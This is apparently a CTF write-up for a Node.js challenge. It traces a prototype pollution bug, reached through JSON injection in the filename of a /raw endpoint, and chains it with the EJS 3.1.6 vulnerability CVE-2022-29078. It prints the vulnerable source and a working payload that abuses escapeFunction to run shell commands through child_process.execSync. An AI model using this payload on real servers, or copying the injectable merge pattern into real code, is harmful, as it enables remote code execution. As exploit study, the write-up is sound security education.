## Environment Pollution (Redeploy)  

<img src="images/chall.png" width=600>

`package.json` shows that the backend uses `ejs@3.1.6`, which has [CVE-2022-29078](https://security.snyk.io/vuln/SNYK-JS-EJS-2803307).  

```json
{
  "name": "node",
  "description": "challenge",
  "main": "app.js",
  "dependencies": {
    "child_process": "^1.0.2",
    "cookie-parser": "^1.4.5",
    "ejs": "^3.1.6",
    "express": "^4.17.1",
    "fs": "^0.0.1-security",
    "jsonwebtoken": "^8.5.1",
    "multer": "^1.4.2",
    "mysql": "^2.18.1"
  },
  "scripts": {
    "start": "node app.js"
  }
}
```

In `userfunc.js`, we can notice a prototype pollution vuln in `merge()`, where attributes are recursively set.  

```js
exports.merge = function(a, b) {
  for (let key in b) {
    if(check(key)){
        if (isObject(a[key]) && isObject(b[key])) {
          this.merge(a[key], b[key]);
        } else {
          a[key] = b[key];
        }
    }
  }
  return a;
}
```

`merge()` is called in the main app, which uses a MySQL database to store files.  

In the `/raw` endpoint, we are allowed to supply a `filename` parameter in the URL. The backend will attempt to fetch the file from the database, and if it doesn't exist, it will embed the filename into an object string and parse it as a JSON object, which will then be merged with an empty object `file`.  

```js
app.get('/raw/:filename', function(req, res){
    const file = {};
    const filename = req.params.filename;
    const filepath = `publics/uploads/${filename}`;

    try{
        func.getfile(mysql.format("select * from filelist where path = ?", filepath), function(err, data){
            if(err) {
                res.send(err);
            }
            else{
                if (data){
                    res.download(data.path);
                }else{
                    try{
                        func.merge(file, JSON.parse(`{"filename":"${filename}", "State":"Not Found"}`));
                        res.send(file);
                    } catch (e) {
                        res.send("I don't know..");
                    }
                }
            }
        });
    } catch (e) {
        res.send("I don't know..");
    }
});
```

We can exploit this prototype pollution vuln to get RCE through the CVE we found earlier.  

`merge()` enforces a filter that blacklists `outputFunctionName`, but there's another method of getting RCE found in later versions of EJS that uses `escapeFunction`.   

```js
const check = function(key){
  filter = ['outputFunctionName', 'path', 'file']
  for (let i = 0; i < filter.length; i++){
    if (filter[i] == key)
      return false
  }
  return true
}
```

Since our filename is directly embedded within the JSON object, we just have to escape the quotes and create the pollution chain in another attribute.  

```json
","__proto__": {"settings": {"view options": {"client": true, "escapeFunction": "1;return process.mainModule.require('child_process').execSync('ls');"}}}, "a":"
```

Passing in our payload to `/raw` and revisiting the index page will then download the flag file.  

Flag: `pocas{My father(E$on Musk) is a great man of the 21st century. I loved you}`